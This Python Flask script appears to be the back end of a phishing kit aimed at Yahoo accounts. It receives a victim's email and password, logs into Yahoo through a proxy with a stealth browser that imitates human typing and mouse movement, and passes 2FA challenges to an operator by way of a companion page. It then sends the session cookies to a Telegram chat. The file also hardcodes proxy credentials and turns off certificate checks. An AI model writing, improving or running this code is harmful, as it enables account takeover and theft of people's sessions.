from flask import Flask, request, jsonify
from flask_cors import CORS
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import json
import random
import telebot
from threading import Thread
from selenium.webdriver.common.action_chains import ActionChains
import os
import ssl

# SSL Bypass
try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context

app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

current_driver = None
current_email = None

PROXIES = [
    {"host": "gate.decodo.com", "port": "7000", "user": "sph7g5g4xx", "pass": "zEfr90tw8nZh5uHWr_"},
]

bot = telebot.TeleBot(BOT_TOKEN)

def human_type(element, text):
    for char in text:
        element.send_keys(char)
        time.sleep(random.uniform(0.08, 0.25))

def random_mouse_move(driver):
    try:
        actions = ActionChains(driver)
        for _ in range(random.randint(4, 8)):
            actions.move_by_offset(random.randint(-80, 80), random.randint(-60, 60)).perform()
            time.sleep(random.uniform(0.4, 0.9))
    except:
        pass

@app.route('/start_login', methods=['POST'])
def start_login():
    data = request.json
    email = data.get('email')
    password = data.get('password')

    if not email or not password:
        return jsonify({"error": "Missing credentials"}), 400

    bot.send_message(CHAT_ID, f"📧 New Login Request\nEmail: {email}")
    Thread(target=selenium_login, args=(email, password)).start()
    return jsonify({"success": True})

def selenium_login(email, password):
    global current_driver, current_email
    driver = None
    try:
        current_email = email
        bot.send_message(CHAT_ID, f"🔄 Starting login for {email}")

        options = uc.ChromeOptions()
        options.headless = True
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--ignore-certificate-errors")
        options.add_argument("--window-size=1920,1080")
        options.binary_location = "/usr/bin/google-chrome"

        driver = uc.Chrome(options=options, use_subprocess=True)
        current_driver = driver

        driver.get("https://login.yahoo.com/")
        time.sleep(8)

        wait = WebDriverWait(driver, 45)

        bot.send_message(CHAT_ID, "📝 Entering Username...")
        username_field = wait.until(EC.element_to_be_clickable((By.NAME, "username")))
        human_type(username_field, email)
        random_mouse_move(driver)
        driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]').click()
        time.sleep(6)

        bot.send_message(CHAT_ID, "🔑 Entering Password...")
        password_field = wait.until(EC.element_to_be_clickable((By.NAME, "password")))
        human_type(password_field, password)
        random_mouse_move(driver)
        driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]').click()

        bot.send_message(CHAT_ID, "⏳ Checking result...")
        time.sleep(15)

        # Passkey Skip
        try:
            skip_button = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, "//*[contains(text(),'Skip') or contains(text(),'skip')]"))
            )
            skip_button.click()
            bot.send_message(CHAT_ID, "✅ Skipped Passkey")
            time.sleep(8)
        except:
            pass

        current_url = driver.current_url.lower()
        if any(x in current_url for x in ["2fa", "verification", "challenge", "otp", "code"]):
            bot.send_message(CHAT_ID, "🔐 2FA Page Detected!\nGo to your 2fa.html and enter the code.")
            return

        bot.send_message(CHAT_ID, "✅ No 2FA. Proceeding...")
        driver.get("https://mail.yahoo.com/")
        time.sleep(12)

        cookies = driver.get_cookies()
        total = len(cookies)

        filename = f"yahoo_cookies_{email.split('@')[0]}.json"
        with open(filename, "w") as f:
            json.dump({
                "email": email,
                "total_cookies": total,
                "full_cookies": {c['name']: c['value'] for c in cookies}
            }, f, indent=2)

        with open(filename, "rb") as f:
            bot.send_document(CHAT_ID, f, caption=f"🎉 Login Successful!\nEmail: {email}\nTotal Cookies: {total}")

    except Exception as e:
        bot.send_message(CHAT_ID, f"❌ Error: {str(e)[:200]}")
    finally:
        if driver:
            driver.quit()

if __name__ == '__main__':
    print("🚀 Backend Started")
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5001)), debug=False)
